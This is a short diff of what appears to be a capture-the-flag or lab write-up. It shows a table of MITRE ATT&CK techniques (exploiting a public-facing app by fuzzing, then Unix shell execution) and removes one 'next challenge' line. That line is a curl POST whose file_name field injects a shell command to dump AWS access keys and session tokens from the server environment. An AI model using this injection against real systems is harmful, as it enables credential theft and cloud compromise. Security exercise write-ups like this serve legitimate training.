@@ -169,5 +169,3 @@ MITRE ATT&CK techniques performed:
 |:---------------|:----------------------------------------------------------|:------------|
 | Initial Access | Exploit Public-Facing Application (T1190)                 | Used `fuzz_evidence_app.py` to fuzz the application |
 | Execution      | Command and Scripting Interpreter: Unix Shell (T1059.003) | Found remote code execution                         |
-
-For next challenge: ```curl -X POST https://d1dw3pytnie47k.cloudfront.net/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}'```
